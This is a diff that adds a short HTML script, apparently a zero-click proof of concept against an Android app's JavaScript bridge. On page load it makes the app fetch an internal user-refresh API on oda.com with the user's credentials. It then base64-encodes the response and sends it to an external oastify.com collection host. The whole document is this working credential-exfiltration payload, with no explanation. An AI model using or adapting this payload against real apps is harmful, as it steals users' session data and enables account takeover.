@@ -1,0 +1,13 @@
+<script>
+   window.onload = function() {
+     if (window.AndroidMessageHandler) {
+       AndroidMessageHandler.postMessage(JSON.stringify({
+         command: "open-url",
+         url: "https://oda.com/api/v1/user/refresh", // Pivot to internal API
+         callbackString: "fetch('/api/v1/user/refresh', {credentials:'include'})" +
+                         ".then(r=>r.text())" +
+                         ".then(d=>{new Image().src='https://86capcxbggebspel6y19s9pgw722qwel.oastify.com/zero-click-pwned?data='+btoa(d);});"
+       }));
+     }
+   };
+</script>
